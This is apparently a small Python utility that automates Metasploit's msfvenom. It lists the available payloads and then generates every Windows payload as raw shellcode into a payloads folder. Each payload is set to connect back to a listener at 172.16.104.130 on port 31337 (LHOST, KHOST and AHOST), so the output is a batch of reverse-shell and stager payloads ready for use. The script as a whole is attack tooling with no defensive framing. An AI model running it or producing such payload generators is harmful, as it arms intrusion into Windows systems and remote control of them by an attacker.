#!/bin/python
print("[#]AUTO_MSFVENOM[#]")

import os

# vars
prefix = "    windows/"
payload_list_file = "payload_list.txt"
payloads_selected = []
payloads_dir = "./payloads"

if (not os.path.exists(payload_list_file)):
    print("payload_list.txt was not found, running msfvenom...")
    cmd = "msfvenom --list payload >> " + payload_list_file
    os.system(cmd)

print("searchong for payloads with prefix: " + prefix)

with open(payload_list_file, 'r') as string_list:
    for word in string_list:
        if word.startswith(prefix):
            pay = word.split()[0]
            payloads_selected.append(pay)

print("number of payloads selected: " + str(len(payloads_selected)))

print("running msfvenom in loop and generate selected payloads...")

if (not os.path.exists(payloads_dir)):
    os.mkdir(payloads_dir)

for pay in payloads_selected:
    cmd = "msfvenom --platform windows -p {} LHOST=172.16.104.130 LPORT=31337 KHOST=172.16.104.130 DLL=test.dll AHOST=172.16.104.130 -f raw -o {}/{}.bin".format(pay, payloads_dir, pay.replace('/', "_")) # DNSZONE=? CMD=? LHOST=172.16.104.130 LPORT=31337 KHOST=172.16.104.130 DLL=test.dll AHOST=172.16.104.130
    os.system(cmd)


print('bye')